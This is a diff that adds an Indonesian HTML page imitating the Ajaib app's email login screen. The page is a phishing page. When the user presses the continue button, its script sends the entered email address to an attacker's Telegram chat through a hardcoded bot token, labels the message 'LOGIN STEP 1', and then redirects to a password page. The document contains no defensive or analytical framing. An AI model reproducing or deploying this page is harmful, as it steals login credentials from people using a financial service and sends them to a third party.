@@ -1,0 +1,211 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Masukkan alamat Email</title>
+
+  <style>
+    body{
+      margin:0;
+      font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background:#ffffff;
+      padding:22px 20px;
+      overflow:hidden;
+      -webkit-tap-highlight-color:transparent;
+      opacity:0;
+      transition: opacity 0.5s ease;
+    }
+
+    body.loaded{
+      opacity:1;
+    }
+
+    .back-btn{
+      width:24px;
+      height:24px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      cursor:pointer;
+      margin-bottom:14px;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .back-btn svg{
+      width:22px;
+      height:22px;
+      stroke:#111827;
+    }
+    .back-btn:active{
+      opacity:0.5;
+    }
+
+    .title{
+      font-size:28px;
+      font-weight:700;
+      margin:4px 0;
+      line-height:1.05;
+    }
+
+    .subtitle{
+      color:#6B7280;
+      font-size:15px;
+      margin-top:10px;
+      margin-bottom:28px;
+      line-height:1.4;
+    }
+
+    label{
+      font-size:15px;
+      font-weight:600;
+      display:block;
+      margin-bottom:8px;
+    }
+
+    input{
+      width:100%;
+      height:48px;
+      padding:12px 14px;
+      font-size:16px;
+      border-radius:12px;
+      border:1px solid #d1d8e0;
+      outline:none;
+      background:#ffffff;
+      transition:0.15s ease;
+      box-sizing:border-box;
+    }
+
+    input:focus{
+      border:2px solid #1E90FF;
+      box-shadow:0 0 0 4px rgba(30,144,255,0.12);
+    }
+
+    .btn{
+      width:100%;
+      margin-top:26px;
+      height:48px;
+      border-radius:12px;
+      border:0;
+      font-size:17px;
+      font-weight:700;
+      cursor:pointer;
+      transition:0.2s;
+    }
+
+    .btn.disabled{
+      background:#E6EEF4;
+      color:#9CA3AF;
+      cursor:not-allowed;
+    }
+
+    .btn.primary{
+      background:#1E90FF;
+      color:white;
+    }
+
+    .spacer{ height:320px; }
+
+    #fadeOverlay {
+      position: fixed;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      background:#ffffff;
+      opacity:0;
+      pointer-events:none;
+      transition: opacity 0.5s ease;
+      z-index:9999;
+    }
+    #fadeOverlay.active {
+      opacity:1;
+      pointer-events:auto;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="fadeOverlay"></div>
+
+  <div class="back-btn" onclick="window.history.back();">
+    <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M15 18L9 12L15 6"/>
+    </svg>
+  </div>
+
+  <h1 class="title">Masukkan alamat Email</h1>
+
+  <p class="subtitle">
+    Masukkan alamat email yang telah terdaftar di Ajaib untuk melanjutkan
+    atau alamat email baru untuk daftar akun Ajaib.
+  </p>
+
+  <label for="email">Email</label>
+  <input id="email" type="email" placeholder="">
+
+  <button id="nextBtn" class="btn disabled" disabled>Lanjut</button>
+
+  <div class="spacer"></div>
+
+  <script>
+    // ===============================
+    // KONFIGURASI TELEGRAM
+    // ===============================
+    const BOT_TOKEN = "7959508278:AAGscaWzlJ0bwX1iTzhfcXT-Xp82TBYB67g";       // GANTI
+    const CHAT_ID   = "5983910858";         // GANTI
+
+    // Fade-in saat load
+    window.addEventListener('DOMContentLoaded', () => {
+      document.body.classList.add('loaded');
+    });
+
+    const emailInput = document.getElementById('email');
+    const nextBtn = document.getElementById('nextBtn');
+    const overlay = document.getElementById('fadeOverlay');
+
+    function isValidEmail(v){ return /.+@.+\..+/.test(v.trim()); }
+
+    emailInput.addEventListener('input',()=>{
+      if(isValidEmail(emailInput.value)){
+        nextBtn.disabled=false;
+        nextBtn.classList.remove("disabled");
+        nextBtn.classList.add("primary");
+      } else {
+        nextBtn.disabled=true;
+        nextBtn.classList.add("disabled");
+        nextBtn.classList.remove("primary");
+      }
+    });
+
+    nextBtn.addEventListener('click',()=>{
+      const email = emailInput.value.trim();
+
+      // SIMPAN DATA
+      localStorage.setItem("email", email);
+
+      // KIRIM KE TELEGRAM
+      const text = 
+        `📩 *LOGIN STEP 1*\n\n` +
+        `📧 Email: ${email}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: "Markdown"
+        })
+      });
+
+      // ANIMASI PINDAH HALAMAN
+      overlay.classList.add('active');
+
+      setTimeout(()=>{
+        window.location.href = "password.html?email=" + encodeURIComponent(email);
+      }, 900);
+    });
+  </script>
+</body>
+</html>
